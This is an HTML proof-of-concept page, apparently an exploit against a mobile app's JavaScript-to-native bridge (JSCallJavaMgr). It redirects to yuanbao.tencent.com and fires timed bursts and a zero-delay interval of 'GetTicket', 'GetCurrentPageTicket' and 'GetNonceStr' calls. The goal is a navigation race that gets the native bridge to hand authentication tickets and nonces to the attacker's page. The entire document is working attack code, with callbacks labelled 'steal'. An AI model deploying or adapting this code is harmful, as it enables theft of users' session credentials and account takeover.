<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race Steal v4</title></head>
<body>
<h2>JSBridge Race - All Tickets</h2>
<pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

var callCount = 0;
function callJSBridge(module, method, param, cbName) {
    callCount++;
    var callId = module + '_' + method + '_' + callCount + '_' + Date.now();
    if (!cbName) cbName = 'cb_' + callId.replace(/[^a-zA-Z0-9_]/g, '_');
    var req = { callback: cbName, module: module, method: method, param: param || {}, callId: callId };
    window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
}

function doRace() {
    if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
    addLog('=== Race Steal v4: All Tickets ===');
    addLog('URL: ' + location.href);

    location.href = "https://yuanbao.tencent.com/";

    var delays = [0, 20, 40, 60, 80, 100, 130, 160, 200, 250, 300, 400, 500];
    for (var d = 0; d < delays.length; d++) {
        (function(delay) {
            setTimeout(function() {
                try {
                    // 所有 ticket_type: 0=W9, 1=W10, 2=W14, 也试 3,4,5
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_w9');
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 1}, 'steal_w10');
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 2}, 'steal_w14');
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 3}, 'steal_t3');
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 4}, 'steal_t4');
                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 5}, 'steal_t5');
                    callJSBridge('CommonPlugin', 'GetCurrentPageTicket', {}, 'steal_page');
                    callJSBridge('CommonPlugin', 'GetNonceStr', {}, 'steal_nonce');
                } catch(e) {}
            }, delay);
        })(delays[d]);
    }

    // setInterval 轮流发不同 type
    var ivCount = 0;
    var iv = setInterval(function() {
        ivCount++;
        var t = ivCount % 6;
        try {
            callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: t}, 'steal_t' + t);
        } catch(e) { clearInterval(iv); }
        if (ivCount > 300) clearInterval(iv);
    }, 0);

    addLog('Race started - all ticket types');
}

setTimeout(function() {
    addLog('Starting in 2s...');
    setTimeout(doRace, 2000);
}, 500);
</script>
</body>
</html>
